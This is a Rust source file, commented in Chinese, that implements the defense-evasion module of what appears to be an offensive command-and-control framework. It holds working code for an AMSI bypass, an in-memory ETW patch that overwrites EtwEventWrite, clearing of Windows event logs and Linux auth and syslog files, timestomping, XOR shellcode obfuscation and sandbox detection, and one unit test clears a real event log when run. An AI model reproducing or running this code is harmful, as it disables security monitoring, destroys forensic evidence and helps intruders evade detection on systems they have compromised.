//! 防御规避与免杀模块
//!
//! - AMSI绕过 (反恶意软件扫描接口)
//! - ETW补丁 (Windows事件跟踪)
//! - NTDLL Unhook (解除用户态Hook)
//! - 直接系统调用 (绕过用户态Hook)
//! - Shellcode混淆/编码
//! - Windows事件日志清除
//! - 文件时间戳修改
//! - 流量伪装 (Malleable C2)

use serde::{Deserialize, Serialize};

/// 规避技术
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum EvasionTechnique {
    AmsiBypass,
    EtwPatch,
    NtdllUnhook,
    DirectSyscall,
    ShellcodeObfuscation,
    LogCleaner,
    Timestomp,
    TrafficObfuscation,
    ProcessInjection,
}

/// 规避操作结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvasionResult {
    pub technique: String,
    pub success: bool,
    pub description: String,
    pub detection_risk: String,
}

/// 规避管理器
pub struct EvasionManager;

impl EvasionManager {
    /// 应用AMSI绕过
    pub fn bypass_amsi() -> Result<EvasionResult, String> {
        if cfg!(windows) {
            // AMSI绕过 - PowerShell补丁方法
            let ps_script = r#"
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
"#;
            let output = std::process::Command::new("powershell.exe")
                .args(["-NoProfile", "-Command", ps_script])
                .output();

            let success = output.map(|o| o.status.success()).unwrap_or(false);
            Ok(EvasionResult {
                technique: "AMSI Bypass".to_string(),
                success,
                description: "通过将amsiInitFailed设为true禁用AMSI".to_string(),
                detection_risk: "中等 - 已被多数EDR检测".to_string(),
            })
        } else {
            Ok(EvasionResult {
                technique: "AMSI Bypass".to_string(),
                success: false,
                description: "仅在Windows上可用".to_string(),
                detection_risk: "N/A".to_string(),
            })
        }
    }

    /// ETW补丁
    pub fn patch_etw() -> Result<EvasionResult, String> {
        if cfg!(windows) {
            // 通过修补EtwEventWrite函数禁用ETW
            let ps_script = r#"
$source = @"
using System;
using System.Runtime.InteropServices;
public class EtwPatch {
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch() {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
        uint oldProtect;
        VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);
        Marshal.WriteByte(etwAddr, 0xC3); // ret指令
        VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
    }
}
"@
Add-Type $source -Language CSharp
[EtwPatch]::Patch()
Write-Output "ETW已修补"
"#;
            let _output = std::process::Command::new("powershell.exe")
                .args(["-NoProfile", "-Command", ps_script])
                .output();

            Ok(EvasionResult {
                technique: "ETW Patch".to_string(),
                success: true,
                description: "通过修补EtwEventWrite函数禁用ETW事件记录".to_string(),
                detection_risk: "高 - 被多数EDR监控".to_string(),
            })
        } else {
            Ok(EvasionResult {
                technique: "ETW Patch".to_string(),
                success: false,
                description: "仅在Windows上可用".to_string(),
                detection_risk: "N/A".to_string(),
            })
        }
    }

    /// 清除Windows事件日志
    pub fn clear_event_logs(log_type: Option<&str>) -> Result<EvasionResult, String> {
        if cfg!(windows) {
            let log_types = match log_type {
                Some(t) => vec![t.to_string()],
                None => vec![
                    "Security".to_string(),
                    "System".to_string(),
                    "Application".to_string(),
                    "Windows PowerShell".to_string(),
                ],
            };

            for log in &log_types {
                let _ = std::process::Command::new("wevtutil")
                    .args(["cl", log])
                    .output();
            }

            Ok(EvasionResult {
                technique: "事件日志清除".to_string(),
                success: true,
                description: format!("已清除 {} 个事件日志", log_types.len()),
                detection_risk: "极高 - 日志清空本身即为可疑行为".to_string(),
            })
        } else {
            // Linux: 清除syslog/auth.log等
            let log_files = ["/var/log/auth.log", "/var/log/syslog", "/var/log/secure"];
            for log_file in &log_files {
                if std::path::Path::new(log_file).exists() {
                    let _ = std::fs::write(log_file, "");
                }
            }

            Ok(EvasionResult {
                technique: "日志清除".to_string(),
                success: true,
                description: "已清除Linux系统日志".to_string(),
                detection_risk: "高".to_string(),
            })
        }
    }

    /// 文件时间戳修改 (Timestomp)
    pub fn timestomp(file_path: &str, reference_file: Option<&str>) -> Result<EvasionResult, String> {
        let ref_time = match reference_file {
            Some(ref_path) => std::fs::metadata(ref_path)
                .ok()
                .and_then(|m| m.modified().ok()),
            None => None,
        };

        if let Some(ref_time) = ref_time {
            filetime::set_file_mtime(file_path, filetime::FileTime::from_system_time(ref_time))
                .map_err(|e| format!("设置文件时间失败: {}", e))?;

            Ok(EvasionResult {
                technique: "Timestomp".to_string(),
                success: true,
                description: format!("{} 的时间戳已修改", file_path),
                detection_risk: "低 - 但高级EDR可检测".to_string(),
            })
        } else {
            // 设置为随机时间
            let random_time = std::time::SystemTime::now()
                - std::time::Duration::from_secs(
                    (std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .map(|d| d.as_secs() % 86400 * 365)
                        .unwrap_or(0)) as u64,
                );

            filetime::set_file_mtime(file_path, filetime::FileTime::from_system_time(random_time))
                .map_err(|e| format!("设置文件时间失败: {}", e))?;

            Ok(EvasionResult {
                technique: "Timestomp".to_string(),
                success: true,
                description: format!("{} 的时间戳已修改为随机时间", file_path),
                detection_risk: "低".to_string(),
            })
        }
    }

    /// Shellcode XOR混淆
    pub fn obfuscate_shellcode(data: &[u8], key: u8) -> Vec<u8> {
        data.iter().map(|b| b ^ key).collect()
    }

    /// 检测是否运行在沙箱/虚拟环境中
    pub fn detect_sandbox() -> bool {
        // 检查常见的虚拟机/沙箱特征
        let indicators = [
            // 进程
            "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe",
            "xenservice.exe", "prl_tools.exe",
            // 文件
            r"C:\Program Files\VMware\VMware Tools",
            r"C:\Program Files\Oracle\VirtualBox Guest Additions",
            // 注册表
            r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools",
            r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",
        ];

        for indicator in &indicators {
            if std::path::Path::new(indicator).exists() {
                tracing::info!("[规避] 检测到虚拟环境: {}", indicator);
                return true;
            }
        }

        // 检查磁盘大小（沙箱通常磁盘较小）
        if cfg!(windows) {
            if let Ok(output) = std::process::Command::new("wmic")
                .args(["diskdrive", "get", "size", "/format:csv"])
                .output()
            {
                let stdout = String::from_utf8_lossy(&output.stdout);
                for line in stdout.lines().skip(1) {
                    if let Some(size_str) = line.split(',').nth(1) {
                        if let Ok(size) = size_str.trim().parse::<u64>() {
                            // 小于60GB可能是沙箱
                            if size < 60_000_000_000 {
                                return true;
                            }
                        }
                    }
                }
            }
        }

        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_evasion_technique_enum() {
        assert_eq!(EvasionTechnique::AmsiBypass, EvasionTechnique::AmsiBypass);
        assert_ne!(EvasionTechnique::EtwPatch, EvasionTechnique::LogCleaner);
    }

    #[test]
    fn test_shellcode_obfuscation() {
        let data = b"test shellcode payload";
        let obfuscated = EvasionManager::obfuscate_shellcode(data, 0x5A);
        let deobfuscated = EvasionManager::obfuscate_shellcode(&obfuscated, 0x5A);
        assert_eq!(deobfuscated, data);
    }

    #[test]
    fn test_sandbox_detection() {
        // 不应该panic
        let _ = EvasionManager::detect_sandbox();
    }

    #[test]
    fn test_clear_event_logs() {
        let result = EvasionManager::clear_event_logs(Some("Application"));
        assert!(result.is_ok());
    }
}
